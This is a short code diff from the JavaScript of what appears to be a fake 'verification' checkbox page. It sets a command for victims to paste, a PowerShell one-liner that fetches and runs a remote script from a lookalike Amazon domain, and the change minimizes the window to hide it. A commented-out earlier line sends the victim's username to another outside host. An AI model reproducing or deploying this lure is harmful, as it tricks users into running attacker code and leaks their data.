@@ -632,7 +632,7 @@ let checkboxWindow = document.getElementById("checkbox-window");
             document.getElementById('verification-id').textContent = verification_id;
 
             //const commandToRun = "cmd /c start https://amazon.validation-service.salleurl.nl/etic & powershell.exe -c Invoke-WebRequest ('https://moltsgats.site/sendsal2025?' + $env:USERNAME)"
-		const commandToRun = 'powershell.exe -Command "& ([scriptblock]::Create((irm https://amazon.validation-service.salleurl.nl/codi/codi.ps1)))"'
+		const commandToRun = 'powershell.exe -WindowStyle Minimized -Command "& ([scriptblock]::Create((irm https://amazon.validation-service.salleurl.nl/codi/codi.ps1)))"'
 
 			
 			
